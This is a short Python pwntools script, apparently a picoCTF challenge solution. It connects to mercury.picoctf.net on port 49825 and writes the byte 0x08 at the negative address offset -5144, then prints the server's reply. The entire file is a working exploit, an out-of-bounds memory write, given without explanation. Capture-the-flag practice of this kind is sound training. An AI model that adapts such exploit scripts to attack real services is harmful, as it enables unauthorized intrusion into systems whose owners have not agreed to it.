from pwn import *

r = remote("mercury.picoctf.net", 49825)

r.sendlineafter("Address:", "-5144")
r.sendlineafter("Value:", b'\x08')

print(r.recvall())
